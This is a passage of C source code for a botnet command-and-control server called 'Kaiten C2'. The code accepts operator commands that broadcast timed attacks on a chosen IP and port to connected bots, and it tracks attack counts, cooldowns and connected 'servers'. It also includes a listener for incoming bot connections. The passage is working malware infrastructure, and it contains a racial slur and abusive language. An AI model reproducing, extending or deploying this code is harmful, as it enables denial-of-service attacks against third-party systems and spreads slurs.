        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return; 
        }


///////////////////////////////////////////////////////////////////////////////////////////////END OF IPHM COMMANDS////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////END OF ADMIN COMMANDS////////////////////////////////////////////////////////////////////////////


			if(strcasestr(buf, "toggle1"))
			{
				if(managements[datafd].msgtoggle == 0)
				{
					sprintf(usethis, "\e[1;35m Recieving Messages Has Been Turned \e[1;31mOFF\r\n");
					if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
					printf("[Kaiten]:%s Has Turned OFF The Receiving of Private Messages\n", managements[datafd].id);
					managements[datafd].msgtoggle = 1;
				} else {
					sprintf(usethis, "\e[1;35m Recieving Messages Has Been Turned \e[1;32mON\r\n");
					if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
					printf("[Kaiten]:%s Has Turned ON The Receiving of Private Messages\n", managements[datafd].id);
					managements[datafd].msgtoggle = 0;		
				}
			}

			if(strcasestr(buf, "toggle2"))
			{
				if(managements[datafd].broadcasttoggle == 0)
				{
					sprintf(usethis, "\e[1;35m Recieving Brodcasts Has Been Turned \e[1;31mOFF\r\n");
					if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
					printf("[Kaiten]:%s Has Turned OFF The Receiving of Broadcasted Messages\n", managements[datafd].id);
					managements[datafd].broadcasttoggle = 1;
				} else {
					sprintf(usethis, "\e[1;35m Recieving Brodcasts Has Been Turned \e[1;32mON\r\n");
					if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
					printf("[Kaiten]:%s Has Turned ON The Receiving of Broadcasted Messages\n", managements[datafd].id);
					managements[datafd].broadcasttoggle = 0;		
				}
			}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
           //yeet
           	if(strstr(buf, "!*"))// argv [0] = !* || argv[1] = METHOD || argv[2] = IP || argv[3] = Port || argv[4] = maxtime
            {
            	if(AttackStatus == 0)
            	{
            		if(managements[datafd].cooldownstatus == 0)
            		{
            			if(Sending[datafd].amountofatks <= 4)
            			{
            				//char jhere[1024];// TESTING ENCRYPTION
                			char rdbuf[1024];
                			strcpy(rdbuf, buf); 
                			//strcpy(jhere, buf);// TESTING ENCRYPTION
                			int argc = 0;
                			unsigned char *argv[10 + 1] = { 0 };
                			char *token = strtok(rdbuf, " ");
                			while(token != 0 && argc < 10)
                			{
                			    argv[argc++] = malloc(strlen(token) + 1);
                			    strcpy(argv[argc - 1], token);
                			    token = strtok(0, " ");
                			} 
                	    
                			if(argc <= 4) 
                			{ 
                			    char invalidargz1[800];
                			    sprintf(invalidargz1, "\e[1;32mNice Job Bud! \r\n");
                			    if(send(datafd, invalidargz1, strlen(invalidargz1), MSG_NOSIGNAL) == -1) goto end;
                			}
						

                			else if(atoi(argv[4]) > managements[datafd].mymaxtime) 
                			{ 
                			    char invalidargz1[800];
                			    sprintf(invalidargz1, "\e[1;31mAttack Time Exceeded!!!\r\n");
                			    if(send(datafd, invalidargz1, strlen(invalidargz1), MSG_NOSIGNAL) == -1) goto end;
                			} else {
		
                				char *line3 = NULL;
								size_t n3 = 0;
								FILE *f3 = fopen("logs/Blacklist.txt", "r");
								    while (getline(&line3, &n3, f3) != -1){
								        if (strstr(line3, argv[2]) != NULL){
								        	sprintf(usethis, "\e[1;37mThe IP \e[1;31m%s \e[1;37mIs Blacklisted\r\n", argv[2]);	
											if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
											sprintf(usethis, "\r\n\e[1;35m%s@\e[1;36m[Kaiten]:", managements[datafd].id);
											if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
								    }
								}
								fclose(f3);
								free(line3);


								/* THIS IS A TEST 
								char testthing[800];	
								enc(jhere);
								sprintf(testthing, "Encrypted STRING: %s\n", jhere);
								 THIS IS A TEST AND IT WORKS*/


            					broadcast(buf, 0, "lol");
            					printf("[Kaiten]:\e[1;37m%s\e[1;31m: Sent A %s Attack To: %s For: %d Seconds\r\n", managements[datafd].id, argv[1], argv[2], atoi(argv[4]));
            					int sendattacklisten;
            					for(sendattacklisten=0;sendattacklisten<MAXFDS;sendattacklisten++)
            					if(managements[sendattacklisten].listenattacks == 1 && managements[sendattacklisten].connected == 1)
            					{
            						sprintf(botnet, "\r\n\e[1;37m%s\e[1;31m: Sent A %s Attack To: %s For: %d Seconds\r\n", managements[datafd].id, argv[1], argv[2], atoi(argv[4]));
            						if(send(sendattacklisten, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
								      
            						sprintf(usethis, "\r\n\e[1;35m%s@\e[1;36m[Kaiten]:\e[1;37m", managements[sendattacklisten].id);
            						if(send(sendattacklisten, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
            					}    
            					char attacksentrip[80][2048]; // \e[1;35m
            					int rip;
            					sprintf(attacksentrip[1], "\t\e[1;35m       	         		           \r\n");
            					sprintf(attacksentrip[2], "\t\e[1;35m     	╔══════════════════════════════════╗	                      \r\n");
            					sprintf(attacksentrip[3],"\t\e[1;36m         Kaiten C2 Attack Stats:                                       \r\n");
            					sprintf(attacksentrip[4],"\t\e[1;37m         [Method]\e[1;33m:........\e[1;37m[\e[1;32m%s\e[1;37m]                                              \r\n", argv[1]);
            					sprintf(attacksentrip[5],"\t\e[1;37m         [Target IP]\e[1;33m:.....\e[1;37m[\e[1;32m%s\e[1;37m]                                              \r\n", argv[2]);
            					sprintf(attacksentrip[6],"\t\e[1;37m         [Seconds]\e[1;33m:.......\e[1;37m[\e[1;32m%d\e[1;37m]                                              \r\n", atoi(argv[4]));
            					sprintf(attacksentrip[7],"\t\e[1;37m         [Attacks]\e[1;33m:.......\e[1;37m[\e[1;32m%d\e[1;37m]                                              \r\n", attacksrunning);
            					sprintf(attacksentrip[8],"\t\e[1;37m         [Cooldown]\e[1;33m:......\e[1;37m[\e[1;32m%d\e[1;37m]                                              \r\n", managements[datafd].mycooldown - managements[datafd].cooldownsecs);
            					sprintf(attacksentrip[9],"\t\e[1;37m         [Servers]\e[1;33m:.......\e[1;37m[\e[1;32m%d\e[1;37m]                                              \r\n", botsconnect());
            					sprintf(attacksentrip[10],"\t\e[1;37m         [Nodes]\e[1;33m:........ \e[1;37m[\e[1;32m6\e[1;37m]                                               \r\n");
            					sprintf(attacksentrip[11],"\t\e[1;36m         Kaiten K-Bot C2                                               \r\n");
            					sprintf(attacksentrip[12],"\t\e[1;35m       ╚══════════════════════════════════╝                             \r\n");
            					//sprintf(attacksentrip[13],"\t\e[1;33m \r\n");
  								for(rip=0;rip<30;rip++)
   								{
  									if(send(datafd, attacksentrip[rip], strlen(attacksentrip[rip]), MSG_NOSIGNAL) == -1) goto end;
  								}
  								//if(send(datafd, testthing, strlen(testthing), MSG_NOSIGNAL) == -1) goto end;
  								pthread_t cooldownthread;
  									struct CoolDownArgs argz;

  								pthread_t attackcooldownthread;
  									struct CoolDownArgs yer;
  								if(managements[datafd].mycooldown > 1)
  								{
  									argz.sock = datafd;
  									argz.seconds = managements[datafd].mycooldown;
  									yer.sock = datafd;
  									yer.seconds = atoi(argv[4]);

  									pthread_create(&cooldownthread, NULL, &StartCldown, (void *)&argz);
  									pthread_create(&attackcooldownthread, NULL, &attacktime, (void*)&yer);
  									pthread_create(&title, NULL, &TitleWriter, sock);
  								}

  								if(Sending[datafd].amountofatks >= 3)
  								{
  									sprintf(usethis, "\e[1;36mYour Cooldown Is: \e[1;37m%d You Have \e[1;37m%d \e[1;36mAttacks Running\r\n", managements[datafd].mycooldown, Sending[datafd].amountofatks);
  									if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
  								}
  							}
  						} else {
  							sprintf(usethis, "\e[1;36mYou Have 6 Running Attacks, Please Wait\n");
  							if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
  						}
                	} else {
                		sprintf(usethis, "\e[1;36mCooldown Time Left: %d\r\n", managements[datafd].mycooldown - managements[datafd].cooldownsecs);
                		if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
                	}
                } else {
                	sprintf(usethis, "\e[1;31mAttacks Are Disabled. Please Be Patient\r\n");
                	if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;                	
                }
                memset(buf, 0, sizeof(buf));  
            }	

            /* TESTING API ATTACK FUNCTION*/
            if(strcasestr(buf, "sidfhhiasgbdQWDGUHGQWD")) // argv[0] = SEND || argv[1] = METHOD  || argv[2] = IP || argv[3] = PORT || argv[4] = Time
            {
            	if(AttackStatus == 0)
            	{
            		if(managements[datafd].cooldownstatus == 0)
            		{
            			if(Sending[datafd].amountofatks <= 4)
            			{
            				char rdbuf[1024];
               				strcpy(rdbuf, buf); 
            				int argc = 0;
                			unsigned char *argv[10 + 1] = { 0 };
                			char *token = strtok(rdbuf, " ");
                			while(token != 0 && argc < 10)
                			{
                			    argv[argc++] = malloc(strlen(token) + 1);
                			    strcpy(argv[argc - 1], token);
                			    token = strtok(0, " ");
                			} 
			
                			if(argc <= 4) 
                			{ 
                			    char invalidargz1[800];
                			    sprintf(invalidargz1, "\e[1;35mInvalid Syntax\r\n");
                			    if(send(datafd, invalidargz1, strlen(invalidargz1), MSG_NOSIGNAL) == -1) goto end;
                			}
						
                			else if(atoi(argv[4]) > managements[datafd].mymaxtime) 
                			{ 
                			    char invalidargz1[800];
                			    sprintf(invalidargz1, "\e[1;31m Attack Time Exceeded Sped\r\n");
                			    if(send(datafd, invalidargz1, strlen(invalidargz1), MSG_NOSIGNAL) == -1) goto end;
                			} else {
                				char *line4 = NULL;
								size_t n4 = 0;
								FILE *f4 = fopen("logs/Blacklist.txt", "r");
								    while (getline(&line4, &n4, f4) != -1){
								        if (strstr(line4, argv[2]) != NULL){
								        	sprintf(usethis, "\e[1;31mThe IP %s Is Blacklisted\r\n", argv[2]);	
											if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
											sprintf(usethis, "\r\n\e1;35m%s@\e[1;36m[Kaiten]:", managements[datafd].id);
											if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
								    }
								}
								fclose(f4);
								free(line4);
								char method[800];
								char ip[800];
								char port[800];
								char time[800];
								strcpy(method, argv[1]);
								strcpy(ip, argv[2]);
								strcpy(port, argv[3]);
								strcpy(time, argv[4]);
								
								sprintf(usethis, "Method: %s IP: %s Port: %s Time: %s", method, ip, port, time);
								if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
							}
						} else {
  							sprintf(usethis, "\e[38;5;190mYou Cant Send More Than 6 Attacks.\nYou Have 6 current attacks being sent.\nCalm tf down!\n");
  							if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
  						}
                	} else {
                		sprintf(usethis, "\e[38;5;190mYour Cool Down Has Not Expired Time left: %d\r\n", managements[datafd].mycooldown - managements[datafd].cooldownsecs);
                		if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
                	}		
				} else {
                	sprintf(usethis, "\e[38;5;190mAttacks Are Currently Disabled\r\n");
                	if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;                	
                }
                memset(buf, 0, sizeof(buf));  
            }
            /* TESTING API ATTACK FUNCTION*/

            else if(strcasestr(buf, "Logout"))
            {	
            	char logout[800];
            	sprintf(logout, "Please Wait While We Log You Out...\r\n");
            	if(send(datafd, logout, strlen(logout), MSG_NOSIGNAL) == -1) goto end;
            	sleep(2);
				managements[datafd].connected = 0;
				memset(managements[datafd].id, 0,sizeof(managements[datafd].id));
				close(datafd);
            }




            if(strcasestr(buf, "nigger") || strcasestr(buf, "nig") || strcasestr(buf, "n1g") || strcasestr(buf, "nlg"))
            {
  					sprintf(usethis, "You Racist Cunt...\r\n");
 					if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;           	
            }

            else if(strcasestr(buf, "CLEAR") || strcasestr(buf, "cls")) {
			{
				send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);
				if(strlen(motd) > 0) // change 1 > 2
				{    
					sprintf(banner0,  "\e[1;36m MOTD:\e[1;37m %s\r\n", motd); 
					if(send(datafd, banner0, strlen(banner0), MSG_NOSIGNAL) == -1) goto end;
				}
				//if(send(datafd, banner0,  strlen(banner0),	MSG_NOSIGNAL) == -1) goto end;	
					if(send(datafd, banner1, strlen(banner1), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, banner2, strlen(banner2), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, banner3, strlen(banner3), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, banner4, strlen(banner4), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, banner5, strlen(banner5), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, banner6, strlen(banner6), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, banner7, strlen(banner7), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, banner8, strlen(banner8), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, banner9, strlen(banner9), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, banner10, strlen(banner10), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, banner11,  strlen(banner11),	MSG_NOSIGNAL) == -1) goto end;	
			}
	}

	pthread_create(&title, NULL, &TitleWriter, sock);


		if(strlen(buf) > 120)
			{
				sprintf(usethis, "Why You Trying To Crash The CNC?");
				printf("%s Has Tried To Crash The CNC\r\n", managements[datafd].id); // sketch
				if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
				sleep(5);
				memset(buf, 0, sizeof(buf));
				managements[datafd].connected = 0;
				memset(managements[datafd].id, 0,sizeof(managements[datafd].id));
				close(datafd);

			}
	char input[800];
    sprintf(input, "\r\n\e[1;35m%s@\e[1;36m[Kaiten]:\e[1;37m", managements[datafd].id);
	if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;

}

   


		end:
				for(logoutshit=0;logoutshit<MAXFDS;logoutshit++)
				{
					if(managements[logoutshit].LoginListen == 1 && managements[logoutshit].connected == 1 && loggedin == 0)
					{
						gay[datafd].just_logged_in = 0;
						sprintf(usethis, "\r\n\e[1;35m%s Plan: [%s] Just Logged Out!\r\n", managements[datafd].id, managements[datafd].planname);
						printf("[Kaiten]:%s Plan: [%s] Just Logged Out!\r\n", managements[datafd].id, managements[datafd].planname);
						if(send(logoutshit, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						sprintf(usethis, "\e[1;35m%s@\e[1;36m[Kaiten]:\e[1;37m", managements[logoutshit].id);
						if(send(logoutshit, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
					}
				}
		loggedin = 1;
		managements[datafd].connected = 0;
		memset(managements[datafd].id, 0,sizeof(managements[datafd].id));
		close(datafd);
		OperatorsConnected--;
}



void *BotListener(int port) {
 int sockfd, newsockfd;
        socklen_t clilen;
        struct sockaddr_in serv_addr, cli_addr;
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) perror("ERROR opening socket");
        bzero((char *) &serv_addr, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_addr.s_addr = INADDR_ANY;
        serv_addr.sin_port = htons(port);
        if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding");
        listen(sockfd,5);
        clilen = sizeof(cli_addr);
        while(1)

        {    
        	    client_addr(cli_addr);
                newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
                if (newsockfd < 0) perror("ERROR on accept");
                pthread_t thread;
                pthread_create( &thread, NULL, &BotWorker, (void *)newsockfd);
        }
}
 

int main (int argc, char *argv[], void *sock) {
        signal(SIGPIPE, SIG_IGN);
        int s;
        struct epoll_event event;
        if (argc != 4) {
			fprintf (stderr, "Usage: %s [port] [threads] [cnc-port]\n", argv[0]);
			exit (EXIT_FAILURE);
        }

        checkaccounts();
        checklog();
       	printf("\e[1;35m Kaiten Has Been Screened \r\n"); 
		threads = atoi(argv[2]);
		port = atoi(argv[3]);
        printf("port: %s\n",argv[3]);
        printf("threads: %s\n", argv[2]);
        listenFD = create_and_bind (argv[1]);
        if (listenFD == -1) abort ();
        s = make_socket_non_blocking (listenFD);
        if (s == -1) abort ();
        s = listen (listenFD, SOMAXCONN);
        if (s == -1) {
			perror ("listen");
			abort ();
        }
        epollFD = epoll_create1 (0);
        if (epollFD == -1) {
			perror ("epoll_create");
			abort ();
        }
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1) {
			perror ("epoll_ctl");
			abort ();
        }
        pthread_t thread[threads + 2];
        while(threads--) {
			pthread_create( &thread[threads + 1], NULL, &BotEventLoop, (void *) NULL);
        }
        pthread_create(&thread[0], NULL, &BotListener, port);
        while(1) {
			broadcast("PING", -1, "ZERO");
			sleep(60);
        }
        close (listenFD);
        return EXIT_SUCCESS;
}